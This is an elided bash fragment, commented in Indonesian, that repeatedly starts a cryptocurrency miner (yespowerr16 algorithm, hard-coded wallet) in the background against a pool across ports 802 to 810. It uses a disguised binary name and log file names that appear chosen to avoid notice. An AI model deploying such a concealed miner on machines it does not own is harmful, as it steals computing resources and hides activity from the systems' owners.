...
while [ $(date +%s) -lt $end_time ]; do
  ...
  if [ -f $dynamic_sgr ]; then
    ...
    for port in $(seq 802 810); do
      # Menjalankan proses dengan parameter yang ditentukan di latar belakang
      nohup $dynamic_sgr -a yespowerr16 --pool $ip:$port -u YdenAmcQSv3k4qUwYu2qzM4X6qi1XJGvwC --timeout 120 -t 4 > dance_$port_$timestamp.log 2>&1 &
      process_pid=$!
